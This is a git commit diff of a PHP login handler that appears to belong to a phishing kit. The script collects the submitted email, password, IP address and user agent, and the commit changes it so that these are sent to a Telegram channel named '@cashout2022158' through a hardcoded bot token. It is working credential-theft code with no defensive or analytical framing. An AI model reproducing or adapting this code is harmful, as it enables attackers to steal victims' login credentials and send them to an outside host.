d6631ace82089b9132eef2723ec27eb379612ad6
alexjay158 <113730577+alexjay158@users.noreply.github.com>
2022-10-11 14:25:54 +0200

    Update login.php

--- login.php
+++ login.php
@@ -4,15 +4,11 @@ $Agent=$_SERVER['HTTP_USER_AGENT'];
 $Ip=$_SERVER['REMOTE_ADDR'];
 $email=$_POST['email'];
 $password=$_POST['password'];
+$message = $_GET['message'];
 $nl="\r\n";
 $message = 'EMAIL: ' . $email . $nl.'PASSWORD: ' . $password .$nl. 'IP: ' . $Ip  . $nl. 'USERAGENT: ' . $Agent ;
 $apiToken = "5369209739:AAFaMNk39MGepMZ3E9YrjLqhEHZupqCK-Pw";
-
-$data = [
-    'chat_id' => '@cashout2022158',
-    'text' => 'hi'
-];
-
-$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );
+$chat_id = "@cashout2022158";
+$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?text=".$message."&chat_id=".$chat_id."&parse_mode=HTML");
 // Do what you want with result
 ?>
